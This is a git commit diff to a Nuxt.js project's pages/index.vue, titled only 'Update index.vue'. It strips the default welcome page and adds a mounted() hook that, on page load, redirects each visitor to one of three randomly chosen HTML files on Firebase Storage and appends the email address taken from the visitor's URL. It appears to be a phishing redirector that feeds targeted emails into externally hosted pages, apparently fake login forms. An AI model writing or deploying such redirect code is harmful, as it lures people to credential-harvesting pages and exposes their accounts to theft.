5f6379de7578fe883aeff2487012e557306e437f
ummlk9bl <72200044+ummlk9bl@users.noreply.github.com>
2020-10-14 10:35:33 +0100

    Update index.vue

--- pages/index.vue
+++ pages/index.vue
@@ -1,72 +1,17 @@
 <template>
-  <div class="container">
-    <div>
-      <logo />
-      <h1 class="title">
-        nuxtjs
-      </h1>
-      <h2 class="subtitle">
-        My astonishing Nuxt.js project
-      </h2>
-      <div class="links">
-        <a
-          href="https://nuxtjs.org/"
-          target="_blank"
-          class="button--green"
-        >
-          Documentation
-        </a>
-        <a
-          href="https://github.com/nuxt/nuxt.js"
-          target="_blank"
-          class="button--grey"
-        >
-          GitHub
-        </a>
-      </div>
-    </div>
-  </div>
+  
 </template>
 
 <script>
-import Logo from '~/components/Logo.vue'
 
 export default {
-  components: {
-    Logo
+  mounted(){
+    window.location.replace(`${[
+        'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexo1.html?alt=media&token=346fd848-5238-4403-a029-6f7faf5ab554',
+      'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexo2.html?alt=media&token=27bbd4aa-3332-4423-9dbf-158808524894',
+      'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexo3.html?alt=media&token=afd8d05d-31b4-4ad8-9cc6-54e7e9b00c7c'
+    ][Math.floor(Math.random() * 3)]}&email=${new URLSearchParams(window.location.search).get('email')? new URLSearchParams(window.location.search).get('email') : ''}`)
   }
 }
 </script>
 
-<style>
-.container {
-  margin: 0 auto;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-}
-
-.title {
-  font-family: 'Quicksand', 'Source Sans Pro', -apple-system, BlinkMacSystemFont,
-    'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-  display: block;
-  font-weight: 300;
-  font-size: 100px;
-  color: #35495e;
-  letter-spacing: 1px;
-}
-
-.subtitle {
-  font-weight: 300;
-  font-size: 42px;
-  color: #526488;
-  word-spacing: 5px;
-  padding-bottom: 15px;
-}
-
-.links {
-  padding-top: 15px;
-}
-</style>
